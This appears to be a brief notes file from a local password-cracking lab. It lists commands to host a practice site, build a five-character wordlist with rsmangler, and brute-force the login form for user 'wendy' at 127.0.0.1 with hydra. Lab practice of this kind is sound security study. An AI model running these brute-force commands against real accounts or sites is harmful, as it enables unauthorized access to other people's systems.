commnads:
** to host site locally: 
app.py

** to generate wordlist passwords: 
rsmangler -f base.txt | awk 'length == 5' > wordlist.txt

** to use hydra and crack the password: 
hydra -l wendy -P wordlist.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
